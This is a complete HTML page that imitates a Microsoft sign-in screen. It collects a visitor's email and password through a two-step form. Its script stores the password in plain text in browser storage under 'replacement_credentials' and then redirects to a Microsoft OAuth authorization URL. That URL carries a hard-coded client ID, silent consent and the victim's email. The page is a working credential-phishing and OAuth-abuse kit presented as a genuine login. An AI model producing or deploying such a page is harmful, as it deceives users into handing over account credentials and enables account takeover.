<!doctype html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <style>
    body {
      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
      background-size: cover !important;
    }
    #div1, #div2 { background: #ffffff; }
  </style>
</head>
<body>
  <div class="container">
    <div class="row my-5 py-5">
      <div class="col-lg-6 mx-auto">
        <div class="m-5 p-4" id="div1">
          <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
          <span class="h5">Sign In</span><br>
          <span id="error" class="text-danger" style="display:none;">Please enter a valid email.</span>
          <div class="form-group mt-2">
            <input type="email" class="form-control" id="email" placeholder="Email, phone or skype">
          </div>
          <div class="text-right">
            <button class="btn btn-primary" id="next">Next</button>
          </div>
        </div>
        <div class="m-5 p-4" id="div2" style="display:none;">
          <span id="emailch" class="font-weight-bold"></span><br>
          <span id="msg" class="text-danger" style="display:none;">Please enter your password.</span><br>
          <span class="h5">Password</span>
          <div class="form-group mt-2">
            <input type="password" class="form-control" id="password" placeholder="Enter Password">
          </div>
          <div class="text-right">
            <button class="btn btn-primary" id="submit-btn">Sign in</button>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function(){
      $('#next').click(function(e) {
        const email = $('#email').val().trim();
        if (email) {
          $('#emailch').text(email);
          $('#div1').hide();
          $('#div2').show();
        } else {
          $('#error').show();
        }
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        const email = $('#emailch').text();
        const password = $('#password').val();
        if (!password) {
          $('#msg').show();
          return;
        }
        $('#submit-btn').text('Verifying...').prop('disabled', true);
        localStorage.setItem('replacement_credentials', JSON.stringify({ email, password }));
        const callbackUrl = window.location.origin + '/auth/callback';
        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&scope=https-graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
        window.location.href = microsoftLoginUrl;
      });
    });
  </script>
</body>
</html>
